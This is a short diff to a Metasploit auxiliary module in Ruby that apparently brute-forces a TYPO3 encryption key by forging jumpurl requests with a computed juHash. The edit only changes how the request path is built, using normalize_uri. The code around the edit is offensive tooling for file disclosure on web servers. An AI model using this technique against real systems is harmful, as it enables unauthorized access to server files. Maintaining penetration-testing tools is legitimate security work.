@@ -96,7 +96,9 @@ class Metasploit4 < Msf::Auxiliary
 		juhash = Digest::MD5.hexdigest(juarray)
 		juhash = juhash[0..9] # shortMD5 value for use as juhash
 
-		file_uri = "#{uri}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
+		uri_base_path = normalize_uri(uri, '/index.php')
+
+		file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
 		vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")
 
 		begin
